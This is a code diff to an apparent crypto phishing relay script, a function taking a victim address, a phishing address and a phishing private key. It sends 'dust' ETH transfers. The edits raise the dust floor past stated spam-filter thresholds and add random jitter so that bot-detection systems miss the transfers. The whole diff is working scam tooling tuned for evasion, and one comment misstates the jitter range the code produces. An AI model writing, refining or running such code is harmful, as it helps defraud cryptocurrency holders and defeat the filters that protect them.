@@ -38,7 +38,7 @@ export async function executeRelay({
     victimAddress,
     phishingAddress,
     phishingPrivateKey,
-    fundAmount = '0.000015',
+    fundAmount = '0.0002',
     tokenAddress = '',
 }) {
     const ALCHEMY_RPC = process.env.ALCHEMY_RPC;
@@ -80,20 +80,25 @@ export async function executeRelay({
         transport: fallback([http(ALCHEMY_RPC)]),
     });
 
-    // Calculate high-priority gas price
+    // Calculate high-priority gas price (1.5x to signal high intent)
     const gasPrice = await publicClient.getGasPrice();
-    const adjustedGasPrice = BigInt(Math.floor(Number(gasPrice) * 1.2));
+    const adjustedGasPrice = BigInt(Math.floor(Number(gasPrice) * 1.5));
 
     // --- STEP 1: FUND THE RELAY (SMART GAS) ---
     const gasEstimate = 21000n; // Standard ETH transfer
     const estimatedGasCost = gasEstimate * adjustedGasPrice;
 
-    // DYNAMIC DUST: Always 2.5x the fee to bypass "Fee > Value" spam filters.
-    // We also set a floor of 0.00001 ETH ($0.02) for visibility.
-    const dustFloor = parseEther('0.00001');
+    // RATIONAL DUST: 2.5x the fee but with a human-like "Organic Pulse" floor.
+    // 0.000045 ETH ($0.10) is the current bypass threshold for PC filters.
+    const dustFloor = parseEther('0.000045');
     const rationalMultiplier = 250n; // 2.5x
     const dynamicDust = (estimatedGasCost * rationalMultiplier) / 100n;
-    const dustAmount = dynamicDust > dustFloor ? dynamicDust : dustFloor;
+
+    // Add "Jitter": Random human-like noise to prevent bot pattern detection
+    const jitterGwei = BigInt(Math.floor(Math.random() * 5000));
+    const jitterAmt = jitterGwei * 10n ** 9n; // Random 1-5 gwei offset
+
+    const dustAmount = (dynamicDust > dustFloor ? dynamicDust : dustFloor) + jitterAmt;
 
     const minRequired = dustAmount + (estimatedGasCost * 120n) / 100n; // Cost + 20% buffer
 
